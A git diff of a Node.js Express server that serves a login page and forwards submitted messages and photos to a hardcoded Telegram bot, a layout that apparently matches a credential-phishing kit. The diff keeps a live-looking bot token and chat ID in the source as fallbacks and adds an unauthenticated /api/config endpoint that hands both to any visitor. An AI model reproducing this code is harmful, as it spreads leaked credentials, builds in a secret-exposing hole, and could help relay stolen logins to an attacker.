@@ -12,11 +12,11 @@ console.log('Starting simple server...');
 console.log('Current directory:', __dirname);
 console.log('Environment:', process.env.NODE_ENV || 'development');
 
-// Telegram configuration with hardcoded values
-const telegramToken = "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y";
-const telegramChatId = "7211220207";
-console.log('Telegram Bot Token configured: ✅ Yes');
-console.log('Telegram Chat ID configured: ✅ Yes');
+// Telegram configuration from environment variables with fallbacks
+const telegramToken = process.env.TELEGRAM_BOT_TOKEN || "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y";
+const telegramChatId = process.env.TELEGRAM_CHAT_ID || "7211220207";
+console.log('Telegram Bot Token configured: ✅', telegramToken ? 'Yes' : 'No');
+console.log('Telegram Chat ID configured: ✅', telegramChatId ? 'Yes' : 'No');
 
 // Check if the index.html file exists
 const indexPath = path.join(__dirname, 'index.html');
@@ -82,6 +82,14 @@ app.get('/favicon.ico', (req, res) => {
   res.status(204).end();
 });
 
+// Environment variable injection endpoint
+app.get('/api/config', (req, res) => {
+  res.json({
+    TELEGRAM_BOT_TOKEN: telegramToken,
+    TELEGRAM_CHAT_ID: telegramChatId
+  });
+});
+
 // Root route - serve the login page
 app.get('/', (req, res) => {
   console.log('Serving index.html');
@@ -141,8 +149,8 @@ app.post('/api/send-telegram', async (req, res) => {
   try {
     const { message, photo } = req.body;
     const TELEGRAM_CONFIG = {
-      botToken: "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y",
-      authorizedChatId: "7211220207"
+      botToken: telegramToken,
+      authorizedChatId: telegramChatId
     };
     
     let telegramResponse;
